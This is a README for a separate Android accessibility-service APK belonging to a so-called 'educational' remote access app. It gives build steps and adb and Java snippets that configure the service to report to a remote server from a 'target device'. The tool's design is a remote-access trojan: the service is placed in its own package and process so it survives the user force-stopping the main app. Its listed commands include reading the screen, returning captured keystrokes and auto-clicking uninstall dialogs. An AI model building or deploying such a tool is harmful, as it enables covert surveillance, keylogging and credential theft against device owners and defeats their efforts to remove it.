# Standalone Accessibility Service APK

This is a **separate APK** from the main Remote Access app. Its purpose is to keep
the accessibility service running even when the main app is force-stopped or killed.

## Why a Separate APK?

When the main app (`com.remoteaccess.educational`) is killed (via force stop, battery
optimization, or from recent apps), Android also kills its accessibility service. This
requires the user to manually re-enable accessibility every time.

By placing the accessibility service in a **completely separate APK** with its own
package name (`com.remoteaccess.accessibility`) and its own **separate process**
(`:accessibility`), killing the main app has **zero effect** on this service.

## How It Works

1. **Install both APKs** on the target device.
2. **Enable the service** in Settings → Accessibility → Accessibility Service.
3. **Configure the server** by launching the accessibility APK and passing the server URL:
   ```
   adb shell am start -n com.remoteaccess.accessibility/.ConfigActivity \
     --es server_host "YOUR_SERVER_IP" \
     --ei server_port 6000 \
     --es device_id "DEVICE_ID"
   ```
4. Or from the main app, send a broadcast:
   ```java
   Intent i = new Intent("com.remoteaccess.accessibility.CONFIGURE");
   i.setClassName("com.remoteaccess.accessibility", "com.remoteaccess.accessibility.ConfigActivity");
   i.putExtra("server_host", serverHost);
   i.putExtra("server_port", serverPort);
   i.putExtra("device_id", deviceId);
   startActivity(i);
   ```

## Building

```bash
cd accessibility-apk
./gradlew assembleDebug
# APK is at: app/build/outputs/apk/debug/app-debug.apk
```

## Communication Architecture

```
┌─────────────────────────┐     TCP      ┌──────────────────┐
│  Main App (educational) │ ──────────▶ │  Node.js Server  │
└─────────────────────────┘             └──────────────────┘
                                               ▲
┌─────────────────────────┐     TCP            │
│  Accessibility APK      │ ──────────────────┘
│  (accessibility)        │
│  - StandaloneA11ySvc    │
│  - SocketService        │
│  - SocketClient         │
└─────────────────────────┘
```

Both APKs connect independently to the same server. The accessibility APK registers
itself as `{deviceId}_accessibility` so the server can route gesture/click commands
to it separately.

## Commands Handled

- `touch` — tap at (x, y) coordinates
- `swipe` — swipe in direction (up/down/left/right)
- `press_home` / `press_back` / `press_recents`
- `click_by_text` — find and click element by text
- `read_screen` — dump screen content
- `get_keylogs` — return captured keystrokes
- `enable_uninstall_assist` — auto-click Uninstall/OK for 5 seconds
- `ping` — connectivity check
